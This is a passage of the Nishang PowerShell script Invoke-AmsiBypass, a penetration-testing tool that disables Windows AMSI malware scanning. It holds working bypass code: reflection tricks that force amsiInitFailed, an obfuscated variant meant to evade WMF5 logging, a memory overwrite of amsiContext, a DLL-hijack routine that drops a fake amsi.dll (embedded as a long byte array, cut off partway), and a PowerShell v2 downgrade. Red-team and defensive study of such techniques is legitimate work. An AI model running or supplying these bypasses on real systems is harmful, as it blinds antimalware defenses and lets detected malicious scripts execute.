\"unloadsilent\" { Write-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)' } else { Write-Output \"Executing the bypass.\" [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) } } \"unloadobfuscated\" { Write-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\" if ($ShowOnly -eq $True) { $code = @\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) \"@ Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output $code } else { Write-Output \"Executing the bypass.\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) } } \"unload2\" { Write-Verbose \"Using Matt Graeber's second Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)' } else { Write-Output \"Executing the bypass.\" [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141) } } \"dllhijack\" { Write-Verbose \"Using Cornelis de Plaa's DLL hijack method.\" if ($ShowOnly -eq $True) { Write-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\" Write-Output \"Run the new powershell.exe and AMSI should be gone for that session.\" } else { [Byte[]] $temp = $DllBytes -split ' ' Write-Output \"Executing the bypass.\" Write-Verbose \"Dropping the fake amsi.dll to disk.\" [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp) Write-Verbose \"Copying powershell.exe to the current working directory.\" Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \"Starting powershell.exe from the current working directory.\" & \"$pwd\\powershell.exe\" } } \"psv2\" { Write-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\" if ($ShowOnly -eq $True) { Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\" } else { Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\" $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version if($versions -match \"2.0.50727\") { Write-Verbose \".Net version 2.0.50727 found.\" Write-Output \"Executing the bypass.\" powershell.exe -version 2 } else { Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\" } } } \"obfuscation\" { Write-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\" Write-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\" } } } function Invoke-AmsiBypass { <# .SYNOPSIS Nishang script which uses publicly known methods to bypass/avoid AMSI. .DESCRIPTION This script implements publicly known methods bypass or avoid AMSI on Windows machines. AMSI is a script malware detection mechanism enabled by default in Windows 10. (https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx) This script implements 6 methods of bypassing AMSI. unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session. unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session. unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging. unloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI. The script also provides information on tools which can be used for obfuscation: ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) .PARAMETER Method The method to be used for elevation. Defaut one is unloadsilent. .PARAMETER ShowOnly The bypass is not executed. Just shown to the user. .EXAMPLE PS > Invoke-AmsiBypass -Verbose Above command runs the unloadsilent method. .EXAMPLE PS > Invoke-PsUACme -Method unloadobfuscated -Verbose Above command runs the unloadobfuscated method. .LINK http://www.labofapenetrationtester.com/2016/09/amsi.html https://github.com/samratashok/nishang #> [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $False)] [ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")] [String] $Method = \"unloadsilent\", [Parameter(Position = 1, Mandatory = $False)] [Switch] $ShowOnly ) $AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 